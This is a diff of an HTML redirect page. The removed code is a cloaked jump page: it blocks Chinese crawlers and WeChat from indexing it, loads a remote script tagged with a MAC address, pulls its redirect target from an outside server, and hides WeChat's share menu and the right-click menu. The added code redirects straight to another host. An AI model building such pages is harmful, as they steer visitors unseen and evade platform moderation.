@@ -1,62 +1,16 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta charset="gb2312">
-<meta name="Baiduspider" content="noindex,nofollow" />
-<meta name="Sosospider" content="noindex,nofollow" /> 
-<meta name="sogou spider" content="noindex,nofollow" />
-<meta name="360Spider" content="noindex,nofollow" /> 
-<meta name="YodaoBot" content="noindex,nofollow" /> 
-<meta name="Googlebot" content="noindex,nofollow" /> 
-<meta name="MicroMessenger" content="noindex,nofollow" />
-<meta name="QQBrowser" content="noindex,nofollow" /> 
-<meta content=yes name=apple-mobile-web-app-capable>
-<meta name=viewport content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
-<title>正在加载</title>
-<script async=true src="http://t.wsgblw.com:88/j1.js?MAC=2CB21AFFC91F"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>鬼才</title>
 </head>
-<script src="http://libs.baidu.com/jquery/2.0.0/jquery.js"></script>
-<link rel="stylesheet" href="//mat1.gtimg.com/pingjs/ext2020/dcom-static/build/static/css/static.css" />
 <body>
 <script>
-$.ajax({
-type : 'get',
-url : 'https://zhu.jbhzkf.cn/get.php',
-contentType: "application/json",
-data:{},
-dataType : 'jsonp',
-jsonp: "callback",
-jsonpCallback:"ubotzurl",
-success : function(data){
-if(data.result=="ok"){  
-var jumpurl = data.tzurl;
-var searchURL = window.location.search;
+var searchURL = window.location.search; 
 searchURL = searchURL.substring(1, searchURL.length); 
-window.location.href='http://'+ jumpurl  +searchURL;
-}
-},
-error: function () {
-}
-});
+window.location.href="http://zyf521.applinzi.com/url.html?"+searchURL;
 </script>
-<script>
-function onBridgeReady(){
-WeixinJSBridge.call('hideOptionMenu');
-}
-if (typeof WeixinJSBridge == "undefined"){
-if( document.addEventListener ){
-document.addEventListener('WeixinJSBridgeReady', onBridgeReady, false);
-}else if (document.attachEvent){
-document.attachEvent('WeixinJSBridgeReady', onBridgeReady); 
-document.attachEvent('onWeixinJSBridgeReady', onBridgeReady);
-}
-}else{
-onBridgeReady();
-}
-document.oncontextmenu = function(){
-event.returnValue = false;
-}
-</script>
+
 </body>
 </html>
